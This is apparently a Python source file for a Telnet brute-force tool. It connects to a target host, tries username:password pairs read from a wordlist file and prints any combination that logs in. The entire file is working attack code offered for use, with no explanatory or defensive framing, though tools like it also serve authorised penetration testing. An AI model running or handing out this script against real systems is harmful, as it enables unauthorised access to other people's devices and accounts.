# Python Script for Telnet Brute Force

# Importing Module
import telnetlib, socket, os
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RESET = Fore.RESET


class Telnet_brute:
    def telnetbrute(self, hostname, username, password):
        # Initializing Telnet Client
        client = telnetlib.Telnet(hostname)

        try:
            client.read_until(b"login: ")
        except EOFError:
            print("Error: Read(login) failed")

        try:
            client.write(username.encode('ascii') + b"\n")
        except socket.error:
            print("Error: Write(username) failed")

        if password:
            try:
                client.read_until(b"Password: ")
            except EOFError:
                print("Error: Read(password) failed")

            try:
                client.write(password.encode('ascii') + b"\n")
            except socket.error:
                print("Error: Write(password) failed")

            try:
                (i, obj, byt) = client.expect([b'incorrect', b'@'], 2)
            except EOFError:
                print("Error occurred")

            if i == 1:
                print(f"{GREEN}[+] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
                return True
            else:
                print(f"[!] Invalid credentials for {username}:{password}")

            client.close()
            return False

    def run(self, hostname):
        # Read the file
        parent_dir = os.getcwd()
        wordlist_path = os.path.join(parent_dir, "data", "wordlists", "telnet_wordlist.txt")
        credlist = open(wordlist_path).read().splitlines()

        # Start the brute force
        for cred in credlist:
            username = cred.split(':')[0]
            password = cred.split(':')[1]

            if self.telnetbrute(hostname, username, password):
                break
